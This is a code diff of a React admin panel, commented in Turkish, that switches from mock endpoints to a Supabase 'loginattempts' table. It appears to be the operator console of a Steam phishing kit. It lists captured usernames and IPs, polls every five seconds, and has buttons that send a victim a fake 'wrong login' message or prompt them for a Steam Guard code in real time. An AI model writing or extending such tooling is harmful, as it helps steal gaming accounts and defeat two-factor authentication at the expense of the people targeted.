@@ -1,12 +1,11 @@
-
 import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { RefreshCcw, Shield, Ban, Wifi, WifiOff } from 'lucide-react';
 import { toast } from 'sonner';
 import AdminLogin from '@/components/AdminLogin';
+import { supabase } from "@/integrations/supabase/client";
 
-// Type for our mock database entries
 interface LoginAttempt {
   id: string;
   username: string;
@@ -23,59 +22,50 @@ const AdminPanel = () => {
   const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
   const [isLoading, setIsLoading] = useState(true);
 
-  // Fetch data from our mock database
+  // Supabase'den giriş denemelerini çek
   const fetchLoginAttempts = async () => {
     setIsLoading(true);
     
     try {
-      const response = await fetch('/api/get-credentials');
-      const data = await response.json();
-      setLoginAttempts(data);
+      const { data, error } = await supabase
+        .from('loginattempts')
+        .select('*')
+        .order('timestamp', { ascending: false });
+
+      if (error) throw error;
+      
+      setLoginAttempts(data || []);
     } catch (error) {
-      console.error('Error fetching credentials:', error);
-      toast.error('Veri yüklenirken bir hata oluştu');
+      console.error('Giriş denemeleri çekilirken hata:', error);
+      toast.error('Veriler yüklenirken bir hata oluştu');
     } finally {
       setIsLoading(false);
     }
   };
 
   useEffect(() => {
-    // Only fetch data if authenticated
     if (isAuthenticated) {
       fetchLoginAttempts();
       
-      // Set up polling to refresh data every 5 seconds
+      // Her 5 saniyede bir verileri güncelle
       const interval = setInterval(fetchLoginAttempts, 5000);
       
       return () => clearInterval(interval);
     }
   }, [isAuthenticated]);
 
-  // Handle admin actions
   const handleRetryRequest = async (username: string) => {
     try {
-      await fetch('/api/set-admin-action', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          username,
-          action: 'retry'
-        }),
-      });
+      const { error } = await supabase
+        .from('loginattempts')
+        .update({ status: 'rejected' })
+        .eq('username', username)
+        .eq('status', 'pending');
+
+      if (error) throw error;
       
       toast.success("İşlem başarılı: Kullanıcıya 'Hatalı giriş' mesajı gönderildi");
-      
-      // Update local state immediately for better UX
-      setLoginAttempts(prev => 
-        prev.map(attempt => 
-          attempt.username === username ? { ...attempt, status: 'rejected' } : attempt
-        )
-      );
-      
-      // Refresh the data after a short delay
-      setTimeout(fetchLoginAttempts, 1000);
+      fetchLoginAttempts();
       
     } catch (error) {
       toast.error('İşlem başarısız oldu');
@@ -84,28 +74,16 @@ const AdminPanel = () => {
 
   const handleSteamGuardRequest = async (username: string) => {
     try {
-      await fetch('/api/set-admin-action', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          username,
-          action: 'steam-guard'
-        }),
-      });
+      const { error } = await supabase
+        .from('loginattempts')
+        .update({ status: 'awaiting_2fa' })
+        .eq('username', username)
+        .eq('status', 'pending');
+
+      if (error) throw error;
       
       toast.success("İşlem başarılı: Kullanıcıya Steam Guard kodu soruldu");
-      
-      // Update local state immediately for better UX
-      setLoginAttempts(prev => 
-        prev.map(attempt => 
-          attempt.username === username ? { ...attempt, status: 'awaiting_2fa' } : attempt
-        )
-      );
-      
-      // Refresh the data after a short delay
-      setTimeout(fetchLoginAttempts, 1000);
+      fetchLoginAttempts();
       
     } catch (error) {
       toast.error('İşlem başarısız oldu');
@@ -114,31 +92,15 @@ const AdminPanel = () => {
 
   const handleIpBlock = async (ip: string) => {
     try {
-      const response = await fetch('/api/block-ip', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          ip
-        }),
-      });
+      const { error } = await supabase
+        .from('loginattempts')
+        .update({ status: 'blocked' })
+        .eq('ip', ip);
+
+      if (error) throw error;
       
-      const data = await response.json();
-      
-      if (data.success) {
-        toast.success(`IP Adresi başarıyla engellendi: ${ip}`);
-        
-        // Update local state immediately for better UX
-        setLoginAttempts(prev => 
-          prev.map(attempt => 
-            attempt.ip === ip ? { ...attempt, status: 'blocked' } : attempt
-          )
-        );
-        
-        // Refresh the data after a short delay
-        setTimeout(fetchLoginAttempts, 1000);
-      }
+      toast.success(`IP Adresi başarıyla engellendi: ${ip}`);
+      fetchLoginAttempts();
       
     } catch (error) {
       toast.error('IP engelleme işlemi başarısız oldu');
